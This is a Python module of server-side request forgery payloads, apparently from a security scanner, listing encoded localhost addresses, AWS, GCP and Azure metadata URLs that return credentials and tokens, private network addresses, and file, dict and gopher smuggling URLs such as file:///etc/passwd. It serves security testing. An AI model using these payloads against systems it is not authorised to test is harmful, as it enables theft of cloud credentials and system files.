"""SSRF payloads — internal IPs, cloud metadata, DNS rebinding."""

# Localhost variations
LOCALHOST: list[str] = [
    "http://127.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",       # Octal
    "http://2130706433",        # Decimal
    "http://0x7f000001",        # Hex
    "http://127.1",             # Short form
    "http://127.0.1",
]

# AWS metadata (IMDSv1)
AWS_METADATA: list[str] = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
]

# GCP metadata
GCP_METADATA: list[str] = [
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
]

# Azure metadata
AZURE_METADATA: list[str] = [
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token",
]

# Internal network ranges
INTERNAL_RANGES: list[str] = [
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://192.168.1.1",
    "http://192.168.0.1",
]

# Protocol smuggling / scheme variations
PROTOCOL_SMUGGLE: list[str] = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "dict://localhost:11211/stat",
    "gopher://localhost:25/_HELO%20localhost",
]

# Cloud metadata — all providers combined
CLOUD_METADATA: list[str] = AWS_METADATA + GCP_METADATA + AZURE_METADATA

# All payloads combined (for default usage)
ALL: list[str] = LOCALHOST + CLOUD_METADATA + INTERNAL_RANGES + PROTOCOL_SMUGGLE
